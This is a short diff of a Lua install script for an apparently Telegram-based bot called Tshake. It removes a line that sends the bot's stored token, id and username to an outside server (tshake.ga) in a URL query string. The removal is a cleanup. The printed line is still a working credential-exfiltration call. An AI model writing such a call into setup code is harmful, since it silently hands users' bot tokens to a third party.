@@ -64,7 +64,6 @@ os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("https://tshake.ga/tumblr-source/tumblr-source.php?id="..database:get(Server_Tshake.."Id_Tshake").."&UserName="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
 local RunTshake = io.open("tumblr-Source", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
